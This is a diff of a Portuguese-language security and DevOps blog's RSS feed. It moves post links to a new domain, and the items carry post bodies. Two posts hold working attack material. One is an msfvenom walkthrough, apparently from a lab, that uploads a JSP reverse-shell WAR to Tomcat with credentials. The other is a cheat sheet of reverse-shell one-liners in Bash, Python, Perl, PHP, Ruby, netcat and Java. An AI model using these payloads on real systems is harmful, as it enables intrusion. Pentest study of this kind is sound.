-      <link>https://fxshelll.github.io/posts/sh_msfvenom/</link>
+      <link>https://fxshell.com.br/posts/sh_msfvenom/</link>
       <pubDate>Thu, 23 Jul 2020 02:25:57 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/sh_msfvenom/</guid>
+      <guid>https://fxshell.com.br/posts/sh_msfvenom/</guid>
       <description>echo &#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &gt; exploit.war #IP do seu local host + porta #Criação do arquivo .WAR echo &#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&#34; curl --user &#39;tomcat:$3cureP4s5w0rd123!&#39; --upload-file exploit.war &#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) + porta da aplicação #upload do arquivo .war echo &#34;------------------------------------sucesso no upload -----------------------------------------------------&#34; echo &#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&#34; echo &#34;----------------------------------- http://10.10.10.194:8080/exploit.war ---------------------------------------------&#34; nc -nvlp 4444 #em outra aba do terminal, deixe escutando na porta que desejar # nc -nvlp 4444 Quando estiver ouvindo a porta, vá no navegador e acesse o arquivo que você acabou de fazer o upload:
 </description>
       <content:encoded><![CDATA[echo &#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &gt; exploit.war #IP do seu local host + porta #Criação do arquivo .WAR echo &#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&#34; curl --user &#39;tomcat:$3cureP4s5w0rd123!&#39; --upload-file exploit.war &#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) + porta da aplicação #upload do arquivo .war echo &#34;------------------------------------sucesso no upload -----------------------------------------------------&#34; echo &#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&#34; echo &#34;----------------------------------- http://10.10.10.194:8080/exploit.war ---------------------------------------------&#34; nc -nvlp 4444 #em outra aba do terminal, deixe escutando na porta que desejar # nc -nvlp 4444 Quando estiver ouvindo a porta, vá no navegador e acesse o arquivo que você acabou de fazer o upload:
@@ -2724,10 +2724,10 @@ listening on [any] 4444 ... connect to [10.10.14.29] from (UNKNOWN) [10.10.10.19
     </item>
     <item>
       <title>The_silver_searcher</title>
-      <link>https://fxshelll.github.io/posts/the_silver_searcher/</link>
+      <link>https://fxshell.com.br/posts/the_silver_searcher/</link>
       <pubDate>Thu, 23 Jul 2020 02:17:35 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/the_silver_searcher/</guid>
+      <guid>https://fxshell.com.br/posts/the_silver_searcher/</guid>
       <description>AG https://github.com/ggreer/the_silver_searcher
 Uma ferramenta de busca de código semelhante a ack, com foco na velocidade, faz uma busca recursiva em diretórios e arquivos.
 apt-get install silversearcher-ag </description>
@@ -2737,10 +2737,10 @@ apt-get install silversearcher-ag ]]></content:encoded>
     </item>
     <item>
       <title>Netcat</title>
-      <link>https://fxshelll.github.io/posts/netcat/</link>
+      <link>https://fxshell.com.br/posts/netcat/</link>
       <pubDate>Thu, 23 Jul 2020 02:02:18 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/netcat/</guid>
+      <guid>https://fxshell.com.br/posts/netcat/</guid>
       <description>Netcat O Netcat é um utilitário que lê e grava dados nas conexões de rede, usando o protocolo TCP ou UDP. Foi projetado para ser uma ferramenta confiável de &ldquo;back-end&rdquo; que pode ser usada diretamente ou acionada por outros programas e scripts. É também uma ferramenta rica em recursos para depuração e exploração de rede, pois pode criar quase qualquer tipo de conexão. Usos comuns incluem:
 Proxies TCP simples Clientes e servidores HTTP baseados em shell-script Teste de daemon de rede SOCKS ou HTTP ProxyCommand para SSH Sintaxe: $ nc -nlvp 1234
 </description>
@@ -2755,19 +2755,19 @@ Ou seja, com ele podemos ouvir portas TCP/UDP — basta colocar o nc escutando n
     </item>
     <item>
       <title>Reverse Shell</title>
-      <link>https://fxshelll.github.io/posts/dicasdereverseshell/</link>
+      <link>https://fxshell.com.br/posts/dicasdereverseshell/</link>
       <pubDate>Thu, 23 Jul 2020 01:51:31 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/dicasdereverseshell/</guid>
+      <guid>https://fxshell.com.br/posts/dicasdereverseshell/</guid>
       <description>Python python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.15&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Bash bash -i &gt;&amp; /dev/tcp/192.168.19.68/4455 0&gt;&amp;1 Perl perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; PHP php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; Ruby ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39; Netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f Java r = Runtime.getRuntime() p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[]) p.waitFor() xterm xterm -display 10.0.0.1:1 Xnest :1 xhost +targetip </description>
       <content:encoded><![CDATA[Python python -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.15&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; Bash bash -i &gt;&amp; /dev/tcp/192.168.19.68/4455 0&gt;&amp;1 Perl perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; PHP php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,1234);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; Ruby ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,1234).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39; Netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f Java r = Runtime.getRuntime() p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[]) p.waitFor() xterm xterm -display 10.0.0.1:1 Xnest :1 xhost +targetip ]]></content:encoded>
     </item>
     <item>
       <title>Nikto</title>
-      <link>https://fxshelll.github.io/posts/nikto/</link>
+      <link>https://fxshell.com.br/posts/nikto/</link>
       <pubDate>Thu, 23 Jul 2020 01:47:23 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/nikto/</guid>
+      <guid>https://fxshell.com.br/posts/nikto/</guid>
       <description>NIKTO ================
 Examine o servidor da Web em busca de vulnerabilidades conhecidas, incluindo:
 Configurações incorretas de servidor e software Arquivos e programas padrão Arquivos e programas inseguros Servidores e programas desatualizados Não é necessário fazer a instalação do mesmo pois ele é um script perl.
@@ -2786,10 +2786,10 @@ nikto -h http://192.168.0.126/files -p 8081,443 -o scan.html ]]></content:encode
     </item>
     <item>
       <title>Searchexploit</title>
-      <link>https://fxshelll.github.io/posts/searchexploit/</link>
+      <link>https://fxshell.com.br/posts/searchexploit/</link>
       <pubDate>Thu, 23 Jul 2020 01:46:40 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/searchexploit/</guid>
+      <guid>https://fxshell.com.br/posts/searchexploit/</guid>
       <description>SEARCHSPLOIT Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.
 </description>
       <content:encoded><![CDATA[SEARCHSPLOIT Searchsploit, é uma ferramenta de pesquisa de linha de comando do Exploit-DB que também permite que você leve uma cópia do Exploit Database com você, aonde quer que você vá. O SearchSploit oferece a capacidade de realizar pesquisas off-line detalhadas por meio de sua cópia do repositório com check-out local. Esse recurso é particularmente útil para avaliações de segurança em redes segregadas ou com falta de ar sem acesso à Internet.
@@ -2805,10 +2805,10 @@ $ sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit
     </item>
     <item>
       <title>NMAP</title>
-      <link>https://fxshelll.github.io/posts/toolsforpentest/</link>
+      <link>https://fxshell.com.br/posts/toolsforpentest/</link>
       <pubDate>Wed, 15 Jul 2020 18:02:31 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/toolsforpentest/</guid>
+      <guid>https://fxshell.com.br/posts/toolsforpentest/</guid>
       <description>NMAP ================
 O Nmap (“Network Mapper”) é uma ferramenta de código aberto para exploração de rede e auditoria de segurança. Foi desenhada para escanear rapidamente redes amplas, embora funcione igualmente bem contra hosts individuais. O Nmap utiliza pacotes IP em estado bruto (raw) de forma inovadora para determinar quais hosts estão disponíveis na rede, quais serviços estão em execução, sistemas operacionais e versões, tipos de filtros de firewall e outras características. É amplamente utilizado por administradores de segurança para inventário de sistemas, gerenciamento de serviços e monitoramento de disponibilidade.
 </description>
@@ -2840,10 +2840,10 @@ chmod +x maroto_scan.sh # Resumo: # Porta aberta = SYN + ACK # Porta Fechada = R
     </item>
     <item>
       <title>API de usuários e autenticação</title>
-      <link>https://fxshelll.github.io/posts/api-de-usu%C3%A1rios-e-autentica%C3%A7%C3%A3o/</link>
+      <link>https://fxshell.com.br/posts/api-de-usu%C3%A1rios-e-autentica%C3%A7%C3%A3o/</link>
       <pubDate>Sat, 09 Mar 2019 16:00:36 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/api-de-usu%C3%A1rios-e-autentica%C3%A7%C3%A3o/</guid>
+      <guid>https://fxshell.com.br/posts/api-de-usu%C3%A1rios-e-autentica%C3%A7%C3%A3o/</guid>
       <description>API REST desenvolvida com Node.js e MongoDB para gerenciamento de usuários e autenticação via JWT.
 Ideal para aplicações que exigem controle de acesso, login seguro e rotas protegidas.
 git: https://github.com/fxshelll/api-users-auth Tecnologias Utilizadas Node.js + Express — Framework para construção da API MongoDB + Mongoose — Banco de dados NoSQL JWT (JSON Web Token) — Autenticação segura bcrypt — Criptografia de senhas dotenv — Gerenciamento de variáveis de ambiente Swagger — Documentação dos endpoints Docker + Docker Compose — Containerização da aplicação Jest + Supertest — Testes automatizados Estrutura do Projeto api-users-auth/ ├── 📂 src/ # Código-fonte principal │ ├── 📂 config/ # Configuração da conexão com MongoDB │ ├── 📂 controllers/ # Funções que recebem as requisições HTTP │ ├── 📂 middleware/ # Middlewares de autenticação e autorização │ ├── 📂 models/ # Modelos de dados (ex: User) │ ├── 📂 routes/ # Definição das rotas da API │ ├── 📂 services/ # Regras de negócio (ex: login, cadastro) │ └── 📂 utils/ # Funções auxiliares (ex: hash de senha, JWT) │ ├── 📂 tests/ # Testes automatizados com Jest e Supertest ├── 📂 docs/ # Documentação adicional (ex: diagramas, notas) │ ├── 📄 .env # Variáveis de ambiente (porta, URI, segredo JWT) ├── 📄 .gitignore # Arquivos e pastas ignorados pelo Git ├── 📄 Dockerfile # Configuração do container da API ├── 📄 docker-compose.yml # Orquestração dos containers (API + MongoDB) ├── 📄 README.md # Manual do projeto ├── 📄 package.json # Configuração do projeto Node.js └── 📄 swagger.yaml # Documentação dos endpoints via Swagger Tecnologias Node.js, Express, MongoDB (Mongoose), JWT, bcrypt, Swagger, Jest, Docker.
@@ -2859,10 +2859,10 @@ exemplo, registro de usuário:
     </item>
     <item>
       <title>bpytop</title>
-      <link>https://fxshelll.github.io/posts/bpytop/</link>
+      <link>https://fxshell.com.br/posts/bpytop/</link>
       <pubDate>Sat, 09 Mar 2019 16:00:36 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/bpytop/</guid>
+      <guid>https://fxshell.com.br/posts/bpytop/</guid>
       <description>
 Monitor de recursos que mostra uso e estatísticas de processador, memória, discos, rede e processos. https://github.com/aristocratos/bpytop
 sudo apt install bpytop </description>
@@ -2872,10 +2872,10 @@ sudo apt install bpytop ]]></content:encoded>
     </item>
     <item>
       <title>Escalabilidade e Conteinerização</title>
-      <link>https://fxshelll.github.io/posts/escalabilidade-e-conteineriza%C3%A7%C3%A3o-/</link>
+      <link>https://fxshell.com.br/posts/escalabilidade-e-conteineriza%C3%A7%C3%A3o-/</link>
       <pubDate>Sat, 09 Mar 2019 16:00:36 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/escalabilidade-e-conteineriza%C3%A7%C3%A3o-/</guid>
+      <guid>https://fxshell.com.br/posts/escalabilidade-e-conteineriza%C3%A7%C3%A3o-/</guid>
       <description>Pense em um container como uma espécie de caixinha isolada onde você coloca uma aplicação e tudo que ela precisa para rodar: bibliotecas, dependências, arquivos de configuração e recursos específicos. Essa&quot;caixinha&quot; fica fechada, isolada do ambiente externo, garantindo que a aplicação dentro dela sempre rode da mesma forma, não importa onde ela esteja
 Tecnicamente falando, um container é um ambiente isolado no nível do sistema operacional. Diferente das máquinas virtuais (que simulam um computador completo, com sistema operacional e tudo), os containers compartilham o kernel (núcleo) do sistema operacional do host. Isso significa que containers não precisam carregar um sistema inteiro para funcionar — eles reutilizam o que já existe no host, reduzindo drasticamente o uso de recursos.
 </description>
@@ -3027,10 +3027,10 @@ LIVRO: “Como se faz DevOps: Organizando pessoas, dos silos aos times de plataf
     </item>
     <item>
       <title>Microservices Async Demo</title>
-      <link>https://fxshelll.github.io/posts/microservices-async-demo/</link>
+      <link>https://fxshell.com.br/posts/microservices-async-demo/</link>
       <pubDate>Sat, 09 Mar 2019 16:00:36 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/microservices-async-demo/</guid>
+      <guid>https://fxshell.com.br/posts/microservices-async-demo/</guid>
       <description>Este projeto demonstra uma arquitetura de microsserviços com comunicação assíncrona utilizando RabbitMQ. O objetivo é aplicar os conceitos de desacoplamento, escalabilidade e mensageria aprendidos na disciplina.
 Tecnologias utilizadas Node.js com Express RabbitMQ (mensageria) Docker e Docker Compose cURL para testes de API Estrutura do Projeto microservices-async-demo/ │ ├── docker-compose.yml ├── README.md │ ├── service-order/ │ ├── Dockerfile │ ├── package.json │ ├── wait-for-rabbit.sh │ └── src/ │ └── index.js │ ├── service-payment/ │ ├── Dockerfile │ ├── package.json │ ├── wait-for-rabbit.sh │ └── src/ │ └── index.js Microsserviços ServiceOrder: responsável por criar e listar pedidos (POST /orders, GET /orders). ServicePayment: responsável por processar pagamentos dos pedidos. Fluxo Assíncrono O cliente cria um pedido via ServiceOrder. O ServiceOrder publica uma mensagem no RabbitMQ. O ServicePayment consome a mensagem e processa o pagamento. sequenceDiagram participant Cliente participant ServiceOrder participant RabbitMQ participant ServicePayment Cliente-&gt;&gt;ServiceOrder: POST /orders ServiceOrder-&gt;&gt;RabbitMQ: Publica pedido na fila RabbitMQ-&gt;&gt;ServicePayment: Entrega mensagem ServicePayment-&gt;&gt;ServicePayment: Processa pagamento Como Executar Clonar o repositório: git clone https://github.com/fxshelll/microservices-async-demo.git Subir os serviços: docker compose up --build Acessar o RabbitMQ
 </description>
@@ -3043,10 +3043,10 @@ Testes com cURL curl -X POST http://localhost:3001/orders \ -H &#34;Content-Type
     </item>
     <item>
       <title>Imersão DevOps - Google Cloud</title>
-      <link>https://fxshelll.github.io/posts/imersaodevops/</link>
+      <link>https://fxshell.com.br/posts/imersaodevops/</link>
       <pubDate>Thu, 28 Feb 2019 02:54:51 UT</pubDate>
       <dc:creator>Felipe da Matta</dc:creator>
-      <guid>https://fxshelll.github.io/posts/imersaodevops/</guid>
+      <guid>https://fxshell.com.br/posts/imersaodevops/</guid>
       <description>FastAPI Este projeto é uma API desenvolvida com FastAPI para gerenciar alunos, cursos e matrículas em uma instituição de ensino.
 Pré-requisitos Python 3.10 ou superior instalado Git Docker Passos para subir o projeto # Crie um ambiente virtual python3 -m venv ./venv # Ative o ambiente virtual source venv/bin/activate Instale as dependências: pip install -r requirements.txt Execute a aplicação: uvicorn app:app --reload Acesse a documentação interativa: Abra o navegador e acesse: http://127.0.0.1:8000/docs
 </description>
